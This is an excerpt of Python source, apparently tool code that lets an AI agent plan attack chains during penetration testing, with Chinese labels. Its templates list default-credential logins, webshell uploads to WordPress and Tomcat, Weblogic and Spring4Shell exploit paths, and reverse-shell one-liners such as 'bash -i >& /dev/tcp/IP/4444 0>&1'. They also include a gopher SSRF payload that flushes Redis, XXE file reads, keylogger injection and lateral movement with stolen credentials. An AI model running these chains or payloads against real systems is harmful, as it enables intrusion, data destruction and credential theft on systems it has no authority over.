...
def register_ai_tools(mcp):
    ...
    def smart_exploit_suggest(target: str) -> dict:
        ...
        exploit_db = {
            ...
            "Nginx": {
                ...
                "attack_vectors": ["测试 alias 路径遍历", "检测 nginx.conf 泄露", "测试 CRLF 注入"],
    ...
    def attack_chain_plan(
        vulns: list, detected_cms: str = None, weak_credentials: str = None
    ) -> dict:
        ...
        cms_attack_templates = {
            "WordPress": {
                ...
                "attack_vectors": [
                    {
                        "action": "管理后台登录",
                        "detail": "使用弱口令登录 /wp-admin",
                        "commands": ["访问 /wp-admin", "使用凭证登录"],
                    },
                    {
                        "action": "插件上传",
                        "detail": "上传恶意插件获取Webshell",
                        "commands": ["安装自定义插件", "访问插件文件执行命令"],
                    },
                    {
                        "action": "主题编辑",
                        "detail": "编辑主题文件注入代码",
                        "commands": ["外观→主题编辑器", "修改 404.php 注入代码"],
                    },
                ],
            ...
            "Tomcat": {
                ...
                "attack_vectors": [
                    {
                        "action": "Manager后台",
                        "detail": "使用默认凭证登录Manager",
                        "commands": ["访问 /manager/html", "使用 tomcat:tomcat 登录"],
                    },
                    {
                        "action": "WAR部署",
                        "detail": "上传恶意WAR包",
                        "commands": ["准备 shell.war", "通过Manager部署"],
                    },
                ],
                ...
                "attack_vectors": [
                    {
                        "action": "Actuator利用",
                        "detail": "敏感端点信息泄露",
                        "commands": ["/actuator/env", "/actuator/heapdump"],
                    },
                    {
                        "action": "Spring4Shell",
                        "detail": "CVE-2022-22965 RCE",
                        "commands": ["构造恶意请求修改日志路径"],
                    },
                ],
                ...
                "attack_vectors": [
                    {
                        "action": "调试模式RCE",
                        "detail": "Ignition RCE",
                        "commands": ["/_ignition/execute-solution"],
                    },
                    {
                        "action": ".env泄露",
                        "detail": "获取数据库凭证",
            ...
            "Weblogic": {
                ...
                "attack_vectors": [
                    {
                        "action": "控制台漏洞",
                        "detail": "CVE-2020-14882 未授权RCE",
                        "commands": ["/console/css/%252e%252e%252fconsole.portal"],
                    },
                    {
                        "action": "T3协议攻击",
                        "detail": "反序列化漏洞",
                        "commands": ["使用ysoserial生成payload"],
                    },
                ],
                ...
                "attack_vectors": [
                    {
                        "action": "脚本控制台",
                        "detail": "Groovy脚本执行",
                        "commands": ["/script 执行系统命令"],
                    },
                    {
                        "action": "凭证提取",
                        "detail": "获取存储的凭证",
                        "commands": ["访问 /credentials/"],
                    },
                ],
        ...
        chain_templates = {
            "sqli": {
                ...
                "next_steps": [
                    {
                        "action": "数据提取",
                        "detail": "使用UNION注入提取数据库信息",
                        "commands": ["sqlmap -u URL --dbs", "sqlmap -u URL -D db --tables"],
                    },
                    {
                        "action": "权限提升",
                        "detail": "尝试读取敏感文件或执行命令",
                        "commands": [
                    ...
                    {
                        "action": "横向移动",
                        "detail": "获取数据库凭据后尝试登录其他服务",
                        "commands": ["使用获取的凭据尝试SSH/RDP"],
                    },
                ],
            ...
            "xss": {
                ...
                "next_steps": [
                    ...
                    },
                    {
                        "action": "钓鱼攻击",
                        "detail": "注入虚假登录表单",
                        "commands": ["注入伪造的登录框获取凭据"],
                    },
                    {
                        "action": "键盘记录",
                        "detail": "注入键盘记录脚本",
                        "commands": ["注入keylogger.js"],
                    },
                ],
            ...
            "file_upload": {
                ...
                "next_steps": [
                    {
                        "action": "Webshell上传",
                        "detail": "上传PHP/JSP/ASP木马",
                        "commands": ["上传 shell.php", "访问 /uploads/shell.php?cmd=id"],
                    },
                    {
                        "action": "反弹Shell",
                        "detail": "获取交互式Shell",
                        "commands": ["nc -lvp 4444", "bash -i >& /dev/tcp/IP/4444 0>&1"],
                    },
                    {
                        "action": "权限提升",
                        "detail": "本地提权",
                ...
                "next_steps": [
                    {
                        "action": "内网探测",
                        "detail": "扫描内网服务",
                        "commands": ["探测 http://127.0.0.1:22", "探测 http://192.168.1.1"],
                    },
                    {
                        "action": "云元数据",
                        "detail": "获取云服务凭据",
                    ...
                    {
                        "action": "服务攻击",
                        "detail": "攻击内网Redis/MySQL等",
                        "commands": ["gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall"],
                    },
                ],
                ...
                "next_steps": [
                    {
                        "action": "反弹Shell",
                        "detail": "获取交互式访问",
                        "commands": ["bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"],
                    },
                    {
                        "action": "信息收集",
                        "detail": "收集系统信息",
                    ...
                    },
                    {
                        "action": "权限提升",
                        "detail": "本地提权",
                        "commands": ["sudo -l", "cat /etc/crontab"],
                    },
                ],
                ...
                "next_steps": [
                    {
                        "action": "文件读取",
                        "detail": "读取敏感文件",
                        "commands": ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"],
                    },
                    {
                        "action": "SSRF",
                        "detail": "探测内网",
                        "commands": ["<!ENTITY xxe SYSTEM 'http://internal-server/'>"],
                    },
                ...
                "next_steps": [
                    {
                        "action": "数据泄露",
                        "detail": "遍历获取其他用户数据",
                        "commands": ["修改id参数: ?id=1, ?id=2, ..."],
                    },
                    {
                        "action": "权限提升",
                        "detail": "访问管理员资源",
                        "commands": ["尝试访问 ?role=admin, ?user_id=1"],
                    },
                    {
                        "action": "账户接管",
                        "detail": "修改其他用户信息",
                        "commands": ["PUT /api/user/1 修改密码"],
                    },
                ],
            ...
            "auth_bypass": {
                ...
                "next_steps": [
                    ...
                    },
                    {
                        "action": "功能滥用",
                        "detail": "执行管理操作",
                        "commands": ["创建管理员账户", "修改系统配置"],
                    },
                    {
                        "action": "数据访问",
                        "detail": "访问敏感数据",
                        "commands": ["导出用户数据", "查看系统日志"],
                    },
                ],
        ...
        for cred in creds_list:
            ...
            # 添加直接利用路径到推荐序列（优先级最高）
            attack_chain["recommended_sequence"].insert(
                0,
                {
                    "step": 0,  # 稍后重新编号
                    "source": "credential",
                    ...
                    attack_chain["recommended_sequence"].append(
                        {
                            ...
                            "phase": phase,
                            "action": (
                                ap["next_steps"][0]["action"] if ap["next_steps"] else "利用漏洞"
                            ),
                        }
                    )
